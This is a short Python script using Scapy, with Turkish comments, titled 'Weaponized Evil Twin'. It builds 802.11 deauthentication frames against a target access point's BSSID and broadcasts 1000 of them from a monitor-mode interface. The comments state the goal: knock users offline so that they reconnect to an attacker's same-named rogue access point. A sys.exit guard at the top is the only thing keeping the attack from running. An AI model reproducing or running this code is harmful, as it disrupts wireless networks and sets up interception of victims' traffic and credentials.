import sys
from scapy.all import *

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod 802.11 Deauthentication saldırısı yapar.")

print("--- WEAPONIZED EVIL TWIN ---")

# 1. HEDEF VE ARAYÜZ
target_bssid = "AA:BB:CC:DD:EE:FF" # Hedef Modem
interface = "wlan0mon" # Monitor Modundaki Kart

def attack_logic():
    print(f"[*] Hedef Modem: {target_bssid}")
    
    # 2. DEAUTH PAKETİ (Weaponized Part)
    # Simülasyonda burası yoktu. Sadece Beacon yayını vardı.
    # Bu paket, modemdeki herkese "Bağlantıyı Kes" emri verir.
    
    # addr1=Broadcast (Herkese), addr2=Modem, addr3=Modem
    pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth()
    
    print("[!] SALDIRI BAŞLADI: Kullanıcılar hattan düşürülüyor...")
    
    # Sonsuz döngüde saldırı (DoS)
    # Kullanıcılar kopunca, bizim açtığımız aynı isimli "Evil Twin"e bağlanırlar.
    sendp(pkt, iface=interface, count=1000, inter=0.1)

if __name__ == "__main__":
    attack_logic()